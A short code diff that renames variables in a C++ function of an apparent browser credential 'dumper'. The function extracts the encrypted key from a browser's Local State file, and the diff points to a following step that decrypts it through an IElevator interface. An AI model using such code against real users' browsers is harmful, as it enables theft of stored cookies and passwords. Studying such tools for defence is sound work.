@@ -81,15 +81,15 @@ vector<uint8_t> dumper::key::retrieveEncryptedKey(std::wstring& localStatePath) 
         return {};
     }
 
-    string base64_encrypted_key = fileContent.substr(keyStartPos, keyEndPos - keyStartPos);
-    vector<uint8_t> encrypted_key_with_header = base64::decode(base64_encrypted_key);
+    string base64EncryptedKey = fileContent.substr(keyStartPos, keyEndPos - keyStartPos);
+    vector<uint8_t> encryptedKeyWithHeader = base64::decode(base64EncryptedKey);
 
-    if (encrypted_key_with_header.size() < sizeof(consts::keyPrefix) ||
-        !std::equal(std::begin(consts::keyPrefix), std::end(consts::keyPrefix), encrypted_key_with_header.begin())) {
+    if (encryptedKeyWithHeader.size() < sizeof(consts::keyPrefix) ||
+        !std::equal(std::begin(consts::keyPrefix), std::end(consts::keyPrefix), encryptedKeyWithHeader.begin())) {
         return {};
     }
 
-    return vector<uint8_t>(encrypted_key_with_header.begin() + sizeof(dumper::consts::keyPrefix), encrypted_key_with_header.end());
+    return vector<uint8_t>(encryptedKeyWithHeader.begin() + sizeof(dumper::consts::keyPrefix), encryptedKeyWithHeader.end());
 }
 
 PBYTE dumper::key::decryptKey(Microsoft::WRL::ComPtr<IElevator> elevator, vector<uint8_t>& encryptedKey) {
